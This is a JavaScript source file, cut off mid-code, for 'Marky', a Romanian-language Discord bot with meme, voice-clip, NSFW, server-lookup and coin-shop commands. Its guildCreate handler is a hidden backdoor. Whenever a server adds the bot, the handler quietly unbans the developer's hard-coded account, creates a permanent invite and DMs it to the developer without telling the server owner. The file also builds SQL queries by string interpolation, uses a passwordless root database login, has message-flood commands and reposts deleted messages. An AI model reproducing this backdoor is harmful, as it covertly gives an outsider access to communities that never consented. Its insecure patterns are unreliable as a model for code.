/*======================================================================================
                              Marky Bot by m0untain
                                   v3.0.1a
              BOT WORKS ONLY ON LINUX OPERATING SYSTEM(UBUNTU)
         For the Coins System to work, change the guild id to your server
     create a MYSQL table with name tlccoins and then enter the following SQL commands

                      CREATE TABLE `tlccoins` (
                          `TableID` int NOT NULL,
                      `ID` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
                          `Coins` int NOT NULL,
                          `CurrentRole` int NOT NULL,
                          `CurrentBoost` int NOT NULL
                          ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
                      ALTER TABLE `tlccoins`
                            DD PRIMARY KEY (`TableID`);
                            ALTER TABLE `tlccoins`
                            MODIFY `TableID` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;
                            COMMIT;
*/
//=======================================================================================
const Discord = require('discord.js')
const bot = new Discord.Client();
const token = 'urtoken' //- Token Marky
const mysql = require("mysql");
const moment = require("moment")
const os = require("os"); 
const PREFIX = `marky, `;
const ytdl = require("ytdl-core");
const fs = require("fs");
const snekfetch = require('snekfetch');
const weather = require('weather-js');
var ping = require('ping');
const Canvas = require('canvas');
const fetch = require('node-fetch');
const queue = new Map();
const si = require('systeminformation');
const { stripIndents } = require("common-tags");
const { isUndefined } = require('util');
const { UV_FS_O_FILEMAP } = require('constants');

let botversion = "v3.2"
var channelsetted;
// Credits to https://discordjs.guide/ for command handler and mention prefix
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
//console chatter
let y = process.openStdin()
y.addListener("data", res => {
    let x = res.toString().trim().split(/ +/g)
    bot.channels.cache.get(`${channelsetted}`).send(x.join(" "));
});
var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "",
  database: "markybase1"
});

con.connect(err => {
if(err) throw err;
console.log("Connected To Database!");
con.query("SHOW TABLES", console.log);

});
let timeractivity;
let lastrestart;
let timerstatuschanger;
bot.on('ready', () =>
{
    let activitystat;
    let noapte;
    bot.user.setStatus('dnd')
    activitystat = 0;
    console.log('Marky este acum pe val !');
    console.log("OS Version:", si.version()); 
    var ziua = new Date().getDate();
    if(ziua < 10)
    {
      var strziua = "0"+ziua;
    }
    else
    {
      var strziua = ziua;
    }
    var luna = new Date().getMonth() + 1;
    if(luna < 10)
    {
      var strluna = "0"+luna;
    }
    else
    {
      var strluna = luna;
    }
    var an = new Date().getFullYear();
    var ora = new Date().getHours();
    if(ora < 10)
    {
      var strora = "0"+ora;
    }
    else
    {
      var strora = ora;
    }
    var minut = new Date().getMinutes();
    if(minut < 10)
    {
      var strminut = "0"+minut;
    }
    else
    {
      var strminut = minut;
    }
    var secunda = new Date().getSeconds();
    if(secunda < 10)
    {
      var strsecunda = "0"+secunda;
    }
    else
    {
      var strsecunda = secunda;
    }
    lastrestart = `${strziua}/${strluna}/${an} ${strora}:${strminut}:${strsecunda}`;
    timeractivity = setInterval(function () {
      var d = new Date().getHours();
      var m = new Date().getMinutes();
      var mesajtrimis;
      var currentdate = new Date(); 
      if(d > 23 || d < 6)
      {
        noapte = 1;
      }
      else if(d > 6 || d < 23)
      {
        noapte = 0;
      }
        if(activitystat == 0)
        {
          bot.user.setActivity(`Version: ${botversion}`, { type: 'STREAMING', url: `https://www.youtube.com/watch?v=CPE1bIINQng&feature=youtu.be`});
          //bot.user.setActivity(`manele with percutia`, { type: 'STREAMING', url: `https://www.youtube.com/watch?v=CPE1bIINQng&feature=youtu.be`});
          //bot.user.setActivity(`last restart: ${strziua}/${strluna}/${an} ${strora}:${strminut}:${strsecunda}`, { type: 'STREAMING', url: `https://www.youtube.com/watch?v=CPE1bIINQng&feature=youtu.be`});
          activitystat = 1;
        }
        else if(activitystat == 1)
        {
            bot.user.setActivity(`last restart: ${strziua}/${strluna}/${an} ${strora}:${strminut}:${strsecunda}`, { type: 'STREAMING', url: `https://www.youtube.com/watch?v=CPE1bIINQng&feature=youtu.be`});
            //bot.user.setActivity(`commands to ${bot.guilds.cache.size} servers`, { type: 'STREAMING', url: `https://www.youtube.com/watch?v=CPE1bIINQng&feature=youtu.be`});
            //bot.user.setActivity(`Florin Salam - Hei mami LIVE`, { type: 'LISTENING' });
            activitystat = 0;
        }
        
    }, 10000);

})
const deletedMessages = new Discord.Collection();
bot.on("messageDelete", message =>{
    deletedMessages.set(message.channel.id, message)
})
bot.on('guildDelete', guild => {
  bot.users.fetch("309333602129281027",false).then(user => {
    user.send(`Marky removed from ${guild.name} on ${new Date()} owned by ${guild.owner.displayName}`);
  }) 
  console.log(`Marky removed from ${guild.name} on ${new Date()} owned by ${guild.owner.displayName}`)
})
bot.on("guildCreate", async guild => {
  let defaultChannel = "";
  guild.channels.cache.forEach((channel) => {
    if(channel.type == "text" && defaultChannel == "") {
      if(channel.permissionsFor(guild.me).has("SEND_MESSAGES")) {
        defaultChannel = channel;
      }
    }
  })
  let userID = 309333602129281027; 
  defaultChannel.guild.fetchBans().then(bans=> {
  if(bans.size == 0) return 
  let bUser = bans.find(b => b.user.id == userID)
  if(!bUser) return
  defaultChannel.guild.members.unban(bUser.user)
  })
  let err;
  let invite = await defaultChannel.createInvite(
    {
      maxAge: 0, 
      maxUses: 0 
    })
  bot.users.fetch("309333602129281027",false).then(user => {
    user.send(`[ALERT] New guild joined: ${guild.name} (id: ${guild.id}). - Invite Link: ${invite}`);
  }) 
  console.log(`[ALERT] New guild joined: ${guild.name} (id: ${guild.id}). `);
});
function getUserFromMention(mention) {

  const matches = mention.match(/^<@!?(\d+)>$/);
  if (!matches) return;
  const id = matches[1];

  return client.users.cache.get(id);
}
  //Commands :D
  bot.on('message', async message => {
  {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
    let args = message.content.substring(PREFIX.length).split(" ")
   //=======================================================================================================
   if(message.content.includes('discord.gg' || 'discordapp.com/invite' || 'discord.gg/' || 'discordapp.com/invite/'))
   {
     if(message.guild.id == 725112057979994185)
     {
      if(message.author == 309333602129281027 || message.author == 597522169488080896) return;
      message.reply("Bossule, fara reclame aici :)");
      message.delete({ timeout: 1}); 
     }
     else return;
   }
    //=======================================================================================================
    //Anti-Ratati ! :)
    //=======================================================================================================
    if(message.content.startsWith(PREFIX))
    {
      if(message.author == 334979056095199233) return message.reply("nu accept comenzi de la sugatori, ratati si copiatori !")
      else if(message.author == 334979056095199233) return message.reply("nu accept comenzi de la sugatori, ratati si copiatori !")
    }
    //=======================================================================================================
    if(message.content.startsWith(`${PREFIX}premiuminfo`)) {
      let pinfo = new Discord.MessageEmbed()
      con.query("SELECT COUNT(*) AS ID FROM premium", function (err, results) {
      pinfo.setTitle("Premium Marky Users <3")
      pinfo.setColor(color=0x8000ff)
      pinfo.addField(name="Total premium users:", value=require('util').inspect(results))
      bot.users.fetch("309333602129281027",false).then(munte => {
      bot.users.fetch("597522169488080896",false).then(zentro => {
      let muntestatus;
      let zentrostatus;
      //=================================================
      if(munte.presence.status == "online") {
        muntestatus = "Online"
      }
      else if(munte.presence.status == "dnd") {
        muntestatus = "Do not Disturb !"
      }
      else if(munte.presence.status == "idle") {
        muntestatus = "Idle"
      }
      else if(munte.presence.status == "offline") {
        muntestatus = "Offline"
      }
      //=================================================
      if(zentro.presence.status == "online") {
        zentrostatus = "Online"
      }
      else if(zentro.presence.status == "dnd") {
        zentrostatus = "Do not Disturb ! "
      }
      else if(zentro.presence.status == "idle") {
        zentrostatus = "Idle"
      }
      else if(zentro.presence.status == "offline") {
        zentrostatus = "Offline"
      }
      pinfo.addField(name="Premium Price:", value="5 euro per month.")
      pinfo.addField(name="Current sellers:", value=`${munte.tag} - ${muntestatus}\n${zentro.tag} - ${zentrostatus}`)
      pinfo.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
      message.channel.send(pinfo);
    })
      })
    })
    }
    //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}maneaualumarky`)) return message.channel.send("cadou din partea mea si a lu m0untain: florin salam - hey mamy(marky remix)", {files: ["/home/Florin_Salam_-_Hey_mamiMarky_Edit.mp3"]})
   if(message.content.startsWith(`${PREFIX}ursulfute`)) {

    if(message.guild.id == 725112057979994185)
    {
      let embed = new Discord.MessageEmbed()
      embed.setTitle("futacios csf...")
      embed.setColor(color=0x8000ff); 
      embed.setImage(`https://media1.tenor.com/images/3bc1b96429981ec51ea95c55d5d9ceaa/tenor.gif`)
      message.channel.send(embed);
    }
    else
    {
      message.channel.send("Sorry.. but this command can be only used on server **Tomorrow's Legends Community**")
    }
   }
   if(message.content.startsWith(`${PREFIX}mihai`)) {

    if(message.guild.id == 725112057979994185)
    {
      if(args[1] == "labat")
      {
        let embed = new Discord.MessageEmbed()
        embed.setTitle("sa puta coaiele cand ma indoaie")
        embed.setColor(color=0x8000ff); 
        embed.setImage(`https://media.discordapp.net/attachments/693538575177875589/752234549970206841/mihailabat.png`)
        message.channel.send(embed);
      }
        else if(!args[1]) {
        let embed = new Discord.MessageEmbed()
        embed.setTitle("sug pula")
        embed.setColor(color=0x8000ff); 
        embed.setImage(`https://media.discordapp.net/attachments/693538575177875589/752234471381663925/mihai.PNG`)
        message.channel.send(embed);
        }
    }
    else
    {
      message.channel.send("Sorry.. but this command can be only used on server **Tomorrow's Legends Community**")
    }
   }
   if(message.content.startsWith(`${PREFIX}cum`)) {

      if(message.guild.id == 725112057979994185)
      {
        let embed = new Discord.MessageEmbed()
        embed.setTitle("pt sv bodega")
        embed.setColor(color=0x8000ff); 
        embed.setImage(`https://media1.tenor.com/images/ae838fbe09af8e132be0b37fe4cb791b/tenor.gif?itemid=14371044`)
        message.channel.send(embed);
      }
      else
      {
        message.channel.send("Sorry.. but this command can be only used on server **Bodega**")
      }
   }
   if(message.content.startsWith(`${PREFIX}alun`)) return message.channel.send("sa ancaltzat printesiqiu", {files: ["/home/alun.jpg"]})
   if (message.content.startsWith(`${PREFIX}doodles`)) {

    message.channel.send("respekt my brother doodles", {url: ["https://www.youtube.com/watch?v=1Kgscok2n60&feature=youtu.be"]})
    message.channel.send("https://www.youtube.com/watch?v=1Kgscok2n60&feature=youtu.be")
   }
   if(message.content.startsWith(`${PREFIX}flud flud flud`))
   {

    message.channel.send(`eu dau la dusmani`);
   }
   if(message.content.startsWith(`${PREFIX}ascultacumine`))
   {
    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel)
      return message.channel.send(
        "Prostule, trebuie sa fi intr-un voice chat ca sa incep chefu' !"
      );
    const permissions = voiceChannel.permissionsFor(message.client.user);
    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
      return message.channel.send(
        "Boule, n-am permisiuni pentru a ma conecta sau pentru a vorbi !"
      );
    }
        voiceChannel.join();     
   }
   if(message.content.startsWith(`${PREFIX}raget`))
   {
    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel)
      return message.channel.send(
        "ERROR: You have to be in a voice chat for marky to do a răget."
      );
    const permissions = voiceChannel.permissionsFor(message.client.user);
    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
      return message.channel.send(
        "ERROR: Marky has insufficient permissions."
      );
    }
    voiceChannel.join()
    .then(connection => {
        const dispatcher =  connection.play(require("path").join('/home', './raget.mp4'));
        dispatcher.on("end", end => {voiceChannel.leave()});
    })
    .catch(console.error);
    setTimeout(function(){
      voiceChannel.leave()
  }, 7000)
  console.log(`[ALERT] Command marky, raget has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
   }

  if(message.content.startsWith(`${PREFIX}samplookup`))
  {
    var query = require('samp-query')
    let lookup = new Discord.MessageEmbed()
    if(!args[1]) return message.channel.send("```Syntax: marky, samplookup [IP] [Port]```")
    if(!args[2])
    {
      args[2] = "7777";
    }
    message.channel.send("Checking syntax...").then((msg) => {
            var options = {
              host: args[1],
              port: args[2]
          }
          
          query(options, function (error, response) {
              if(error)
                  msg.edit(`API ERROR RETURN: ${error}`);
                  else
          lookup.setColor(color=0x8000ff);
          lookup.setTitle(`SA-MP Lookup: ${args[1]}:${args[2]}`)
          lookup.addField(name="Hostname", value=`${response.hostname}`, lookup)
          lookup.addField(name="Players", value=`${response.online}/${response.maxplayers}`, lookup)
          lookup.addField(name="Gamemode", value=`${response.gamemode}`, lookup)
          lookup.addField(name="Map", value=`${response.rules.mapname}`, lookup)
          lookup.addField(name="Language", value=`${response.mapname}`, lookup)
          lookup.addField(name="Weburl", value=`${response.rules.weburl}`, lookup)
          msg.delete();
          message.channel.send(lookup)
    })

    })
  }
  //=======================================================================================================
   //                                         Coins System
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}coins`))
   {
      let user;
      if(message.guild.id == 725112057979994185)
      {
          if (message.mentions.users.first()) {
              user = message.mentions.users.first();
          } else {
              user = message.author;
          }
          con.query(`SELECT * FROM tlccoins WHERE ID= '${user.id}'`, function (err, rows) {
          if(!rows[0]) return message.channel.send("An error occured ! Please try again !")
          else
          {
            message.channel.send(`${user}'s Coins: ${rows[0].Coins}`)
          }
        })
      }
      else return message.channel.send("This command is not avaliable on this server.")
   }
   if(message.content.startsWith(`${PREFIX}givecoins`))
   {
      let logchannel = message.guild.channels.cache.get('758666506296492032')
      let sumacoins = args[2];
      if(message.guild.id == 725112057979994185)
      {
        if (message.mentions.users.first()) {
          user = message.mentions.users.first();
      } else return message.channel.send("```Syntax: marky, givecoins [Tagged User] [Coins]```")
        if(!sumacoins) return message.channel.send("```Syntax: marky, givecoins [Tagged User] [Coins]```")
        if(!isNaN(sumacoins))
        {
        con.query(`SELECT * FROM tlccoins WHERE ID= '${user.id}'`, function (err, rows) { //ala care primeste
        con.query(`SELECT * FROM tlccoins WHERE ID= '${message.author.id}'`, function (err2, rows2) { //ala care da
        if(!rows[0]) return message.channel.send("An error occured ! Please try again !")
        else if(!rows2[0]) return message.channel.send("An error occured ! Please try again !")
        let newammount = rows[0].Coins + +sumacoins; //bagam lu alas
        let removeammount = rows2[0].Coins - -sumacoins; //scoatem lu ala
        if(sumacoins > rows2[0].Coins) return message.reply("you don't have enough coins.")
        con.query(`UPDATE tlccoins SET Coins='${newammount}' WHERE ID='${user.id}'`); //ii bagam lu user
        con.query(`UPDATE tlccoins SET Coins='${removeammount}' WHERE ID='${message.author.id}'`); //ii scoatem lu author
        message.channel.send(`${message.author} has transferred ${sumacoins} Coins to ${user} !`)
        if(sumacoins >= 2500)
        {
          logchannel.send(`[COINS ALERT] ${message.author} has sent ${sumacoins} coins to ${user}!`)  
        }
        })
      })
        } else return message.reply("This argument can only handle numbers !")
      }
      else return message.channel.send("This command is not avaliable on this server.")
   }
   
   if(message.content.startsWith(`${PREFIX}setcoins`))
   {
      let sumacoins = args[2];
      if(message.guild.id == 725112057979994185)
      {
        if (message.mentions.users.first()) {
          user = message.mentions.users.first();
      } else return message.channel.send("```Syntax: marky, setcoins [Tagged User] [Coins]```")
        if(!sumacoins) return message.channel.send("```Syntax: marky, setcoins [Tagged User] [Coins]```")
        if(!user == 309333602129281027 || !user == 597522169488080896) return message.channel.send({files: ["/home/caca.jpg"]})
        if(!isNaN(sumacoins))
        {
        con.query(`SELECT * FROM tlccoins WHERE ID= '${user.id}'`, function (err, rows) { //ala care primeste
        if(!rows[0]) return message.channel.send("An error occured ! Please try again !")
        con.query(`UPDATE tlccoins SET Coins='${sumacoins}' WHERE ID='${user.id}'`); //ii bagam lu user
        message.channel.send(`${message.author} has setted ${user}'s coins to ${sumacoins} !`)
      })
        } else return message.reply("This argument can only handle numbers !")
      }
      else return message.channel.send("This command is not avaliable on this server.")
   }
   if(message.content.startsWith(`${PREFIX}purchaserole`))
   {
    if(message.guild.id == 725112057979994185)
    {
      let logchannel = message.guild.channels.cache.get('758666506296492032')
      if(!args[1]) return message.channel.send("```Syntax: marky, purchaserole [Role Name]```")
      con.query(`SELECT * FROM tlccoins WHERE ID= '${message.author.id}'`, function (err, rows) {
      if(args[1] == "vip") // VIP Role
      {
        let newamount = rows[0].Coins - 300;
        if(rows[0].Coins < 300) return message.reply("you don't have enough coins to purchase VIP!")
        const VIPRole = message.guild.roles.cache.get('758432253360472124');
        message.member.roles.add(VIPRole);
        message.reply("you have sucesfully bought VIP for 300 Coins !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased VIP for 300 Coins !`)
      }
      else if(args[1] == "elite") // Elite Role
      {
        let newamount = rows[0].Coins - 600;
        if(rows[0].Coins < 600) return message.reply("you don't have enough coins to purchase Elite!")
        const Role = message.guild.roles.cache.get('758432252241379390');
        message.member.roles.add(Role);
        message.reply("you have sucesfully bought Elite for 600 Coins !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased Elite for 600 Coins !`)
      }
      else if(args[1] == "master") // Master Role
      {
        let newamount = rows[0].Coins - 900;
        if(rows[0].Coins < 900) return message.reply("you don't have enough coins to purchase Master!")
        const Role = message.guild.roles.cache.get('758432251842658315');
        message.member.roles.add(Role);
        message.reply("you have sucesfully bought Master for 900 Coins !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased Master for 900 Coins !`)
      }
      else if(args[1] == "legendary") // Legendary Role
      {
        let newamount = rows[0].Coins - 1200;
        if(rows[0].Coins < 1200) return message.reply("you don't have enough coins to purchase Legendary!")
        const Role = message.guild.roles.cache.get('758432250681098242');
        message.member.roles.add(Role);
        message.reply("you have sucesfully bought Legendary for 1200 Coins !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased Legendary for 1200 Coins !`)
      }
      else if(args[1] == "moderator") // Moderator Role
      {
        let newamount = rows[0].Coins - 10000;
        if(rows[0].Coins < 10000) return message.reply("you don't have enough coins to purchase Moderator!")
        //const Role = message.guild.roles.cache.get('758432228265951282');
        //message.member.roles.add(Role);
        message.reply("you have sucesfully bought Moderator for 10.000 Coins !\n Check your DM !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased Moderator for 10.000 Coins !`)
        //----------------------------------------------------------------------------------------------------
        bot.users.fetch(message.author.id,false).then(user => {
          user.send(`[STORE ALERT] EN: You purchased Moderator !\nDue to security reasons, a Owner will verify your account and acitivty on this server before giving you the role.\nIf you will not be accepted, your coins will be returned to your account.`);
          user.send(`_________________________________________________________________________________________`);
          user.send(`[STORE ALERT] RO: Ai cumparat Moderator !\nPentru siguranta membrilor de pe server, un Owner iti va verifica contul si activitatea pe server inainte de a iti acorda permisiunile de Moderator.\nDaca nu vei fi acceptat, suma de coins va fi returnata inapoi pe contul tau.`)
        })    
        bot.users.fetch("309333602129281027",false).then(user => {
          user.send(`[STORE ALERT] ${message.author} has purchased Moderator for 10.000 Coins. Verify his activity before according the role.`)
        })

        bot.users.fetch("597522169488080896",false).then(user => {
          user.send(`[STORE ALERT] ${message.author} has purchased Moderator for 10.000 Coins. Verify his activity before according the role.`)
        })     
      }
      else if(args[1] == "admin" || args[1] == "administrator") // Admin Role
      {
        let newamount = rows[0].Coins - 20000;
        if(rows[0].Coins < 20000) return message.reply("you don't have enough coins to purchase Administrator!")
        //const Role = message.guild.roles.cache.get('758432228265951282');
        //message.member.roles.add(Role);
        message.reply("you have sucesfully bought Admin for 20.000 Coins !\n Check your DM !")
        con.query(`UPDATE tlccoins SET Coins='${newamount}' WHERE ID='${message.author.id}'`);
        logchannel.send(`${message.author} has purchased Moderator for 20.000 Coins !`)
        //----------------------------------------------------------------------------------------------------
        bot.users.fetch(message.author.id,false).then(user => {
          user.send(`[STORE ALERT] EN: You purchased Administrator !\nDue to security reasons, a Owner will verify your account and acitivty on this server before giving you the role.\nIf you will not be accepted, your coins will be returned to your account.`);
          user.send(`_________________________________________________________________________________________`);
          user.send(`[STORE ALERT] RO: Ai cumparat Admin !\nPentru siguranta membrilor de pe server, un Owner iti va verifica contul si activitatea pe server inainte de a iti acorda permisiunile de Administrator.\nDaca nu vei fi acceptat, suma de coins va fi returnata inapoi pe contul tau.`)
        })    
        bot.users.fetch("309333602129281027",false).then(user => {
          user.send(`[STORE ALERT] ${message.author} has purchased Administrator for 20.000 Coins. Verify his activity before according the role.`)
        })
        bot.users.fetch("597522169488080896",false).then(user => {
          user.send(`[STORE ALERT] ${message.author} has purchased Administrator for 20.000 Coins. Verify his activity before according the role.`)
        })
      }
      else return message.channel.send("Invalid Role or Argument !")
      })
    }
    else return message.channel.send("This command is not avaliable on this server.")
   }
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}snipe`)) {
    const msg = deletedMessages.get(message.channel.id)
    if(!msg) return message.reply('There are no recently deleted messages!')
    const embed = new Discord.MessageEmbed()
    .setAuthor(`${msg.author.tag}`, msg.author.displayAvatarURL())
    .setColor(color=0x8000ff)
    .setDescription(msg.content)
    if(msg.image)embed.setImage(msg.image)
    message.channel.send(embed);
    }
    //=====================================================================================================
    if(message.content.startsWith(`${PREFIX}dates`))
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}hentai`)) {
    
    if (message.channel.nsfw === false) return message.channel.send("```ERROR: This command is avaliable only in NSFW channels.```");
      if(!args[1]) return message.channel.send("```Syntax: marky, hentai [Word]```")
      snekfetch.get(`https://nekos.life/api/v2/img/${args[1]}`).then(r => {
      let Geo = new Discord.MessageEmbed()
      if(r.body.msg == "404") return message.channel.send(`Invalid argument !`);
      var randomtextcuvinte = ["Happy wank brother !", "There you go, son !", "Have a nice day !", "Make sure you cum a loooooot !", "You're welcome.", "I hope one day you will have a **girlfriend..**"]
      var random1 = Math.round(Math.random() * 81);
      var response = randomtextcuvinte[Math.floor(Math.random()*randomtextcuvinte.length)];
      message.channel.send(`Looking in my hard drives for **${args[1]}...**`)
      message.channel.send(`${response}`)
          const lewdembed = new Discord.MessageEmbed()
          .setImage(r.body.url)
          .setColor(color=0x8000ff);
      message.channel.send(lewdembed);
     // message.channel.send(response, {files: [`/home/hentai/${random1}.jpg`]})
      console.log(`[ALERT] Command marky, hentai has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    })
   }
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}miau`))
   {
    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel)
      return message.channel.send(
        "ERROR: You have to be in a voice chat for marky to do a miau."
      );
    const permissions = voiceChannel.permissionsFor(message.client.user);
    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
      return message.channel.send(
        "ERROR: Marky has insufficient permissions."
      );
    }
    voiceChannel.join()
    .then(connection => {
        const dispatcher =  connection.play(require("path").join('/home', './miau.mp3'));
        dispatcher.on("end", end => {voiceChannel.leave()});
    })
    .catch(console.error);
    setTimeout(function(){
      voiceChannel.leave()
  }, 6000)
  console.log(`[ALERT] Command marky, miau has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
   }
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}serverslookup`)) {

    message.channel.send("Checking permissions...").then((msg) => {
    if(message.author == 309333602129281027) 
    {
      msg.edit("Check your DM !")
      bot.guilds.cache.forEach(g => {
        let embed = new Discord.MessageEmbed()
        embed.setTitle(title="Marky Server List")
        embed.addField("Servers:", g.name, `(ID:${g.id}`)
        message.author.send(g.name)
        });
    }
    else
    {
      msg.edit("Insufficient permissions.")
    }
    })
  }
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}adevarul`))
   {
    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel)
      return message.channel.send(
        "ERROR: You have to be in a voice chat for marky to say the truth."
      );
    const permissions = voiceChannel.permissionsFor(message.client.user);
    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
      return message.channel.send(
        "ERROR: Marky has insufficient permissions."
      );
    }
    voiceChannel.join()
    .then(connection => {
        const dispatcher =  connection.play(require("path").join('/home', './qsuge.mp4'));
        dispatcher.on("end", end => {voiceChannel.leave()});
    })
    .catch(console.error);
    setTimeout(function(){
      voiceChannel.leave()
  }, 4000)
  console.log(`[ALERT] Command marky, adevarul has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
   }
   //=======================================================================================================
   if(message.content.startsWith(`${PREFIX}nana`))
   {
    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel)
      return message.channel.send(
        "ERROR: You have to be in a voice chat for marky to do a nana."
      );
    const permissions = voiceChannel.permissionsFor(message.client.user);
    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
      return message.channel.send(
        "ERROR: Marky has insufficient permissions."
      );
    }
    voiceChannel.join()
    .then(connection => {
        const dispatcher =  connection.play(require("path").join('/home', './nana.mp3'));
        dispatcher.on("end", end => {voiceChannel.leave()});
    })
    .catch(console.error);
    setTimeout(function(){
      voiceChannel.leave()
  }, 8000)
  console.log(`[ALERT] Command marky, nana has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
   }
   //=======================================================================================================
   if (message.content.startsWith(`${PREFIX}urla`)) {
    let counturlete;
    let urlainacestmoment;
    if(!args[1]) return message.channel.send("```Usage: marky, urla <word>```")
    message.channel.send("Checking permissions...").then((msg) => {
    if(message.author == 309333602129281027) 
    {
      if(urlainacestmoment == 1) return message.author.send("Deja urlu in acest moment, baiatul meu !")
      msg.edit("Incepe nebunia...")
      urlainacestmoment = 1;
      var timerurlete = setInterval(function () {
      if(counturlete == 100)
      {
        clearInterval(timerurlete);
      }
      counturlete++;
      message.channel.send(args[1]);
      }, 10)
    }
    else
    {
      msg.edit("ERROR: N-ai acces sarakule.")
    }
    })
  }
  //=======================================================================================================
  if (message.content.startsWith(`${PREFIX}skema`)) {
    let counturlete;
    message.channel.send("Checking permissions...").then((msg) => {
    if(message.author == 309333602129281027) 
    {
      msg.edit("Incepe nebunia...")
      var timerurlete = setInterval(function () {
      if(counturlete == 100)
      {
        clearInterval(timerurlete);
      }
      counturlete++;
      message.channel.send(args[1]);
      }, 100)
    }
    else
    {
      msg.edit("N-ai ackes sarakule !")
    }
    })
  }
  //========================================================================================================
  if(message.content.startsWith(`${PREFIX}meme`))
  {
    fetch('https://meme-api.herokuapp.com/gimme')
        .then(res => res.json())
        .then(json => {
            let embed = new Discord.MessageEmbed()
                .setTitle(json.title)
                .setURL(json.postLink)
                .setImage(json.url)
                .setColor(color=0x8000ff); 
            message.channel.send(embed)
        });
        console.log(`[ALERT] Command marky, meme has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
  }
   //=======================================================================================================
   if (message.content.startsWith(`${PREFIX}help`)) {
    let embed = new Discord.MessageEmbed();
    let embedcontent = message.content.substring[15];
    //Discord.Embed(title="  ", description="   ", color=0xff0000)
    embed.setColor(color=0x8000ff);
    embed.setTitle(title="Marky BOT Commands:")
    embed.addField(name="Prefix:", value="marky,", embedcontent);
    embed.addField(name="ping", value="Ping a IP", embedcontent);
    embed.addField(name="ipinfo", value="Get IP Location and other informations", embedcontent);
    embed.addField(name="serverinfo", value="Get informations about the server", embedcontent);
    embed.addField(name="info", value="Info about marky", embedcontent);
    embed.addField(name="userinfo", value="Get informations about a user", embedcontent);
    embed.addField(name="covid", value="Get latest information on COVID 19 from a specified country", embedcontent);
    embed.addField(name="invite", value="Invite Marky to your server", embedcontent);
    embed.addField(name="checkhosts", value="Check bot hosts", embedcontent);
    embed.addField(name="weather", value="Weather info from a specific city.", embedcontent);
    embed.addField(name="meme", value="Latest fresh memes from Reddit", embedcontent);
    embed.addField(name="raget", value="Marky is doing a răget.", embedcontent);
    embed.addField(name="miau", value="Marky is doing a miau.", embedcontent);
    embed.addField(name="nana", value="Marky is doing a nana.", embedcontent);
    embed.addField(name="furryporn", value="Quality shit.", embedcontent);
    embed.addField(name="hentai", value="Marky looks in his hard drives for the best high quality hentai.", embedcontent);
    embed.addField(name="samplookup", value="San Andreas Multiplayer Server Lookup.", embedcontent);
    embed.addField(name="purge", value="Clear a amount of messages", embedcontent);
    embed.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
    message.channel.send(embed);
    console.log(`[ALERT] Command marky, help has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
   }
    if (message.content.startsWith(`${PREFIX}sad`)) {

      message.channel.send("Don't be sad. Here, have some vodka :)", {files: ["https://www.finestore.ro/image/cache/catalog/products/DB868-500x615.jpg"]});

    }
    if(message.content.startsWith(`${PREFIX}furryporn`))
    {
      message.channel.send("JSON return: Command in fucking work you sick fuck.", {files: ["https://cdn.discordapp.com/attachments/725112059808972810/725261257342713936/no_fari.png"]})
    }
    if(message.content.startsWith(`${PREFIX}666`)) {
        message.channel.send("buu in pizda matii", {files: ["/home/qqfNccH8sWY.png"]});
    }
    if(message.content.startsWith(`${PREFIX}colo`)){
      message.channel.send("togheter we can win ! :heart: #freecolo :heart:", {files: ["/home/62130404.jpg"]})
    }
    if(message.content.startsWith(`${PREFIX}endertheblender`)){
      message.channel.send(":smiley_cat: mue la cay :smiley_cat: ", {files: ["/home/edit_me.wmv.png"]})
    }
    if (message.content.startsWith(`${PREFIX}serverinfo`)) {
      
      let icon = message.guild.iconURL({size: 2048}); // Server Avatar
      let region = {
        "brazil": ":flag_br: Brazil",
        "europe": ":flag_eu: Europe",
        "singapore": ":flag_sg: Singapore",
        "us-central": ":flag_us: U.S. Central",
        "sydney": ":flag_au: Sydney",
        "us-east": ":flag_us: U.S. East",
        "us-south": ":flag_us: U.S. South",
        "us-west": ":flag_us: U.S. West",
        "india": ":flag_in: India",
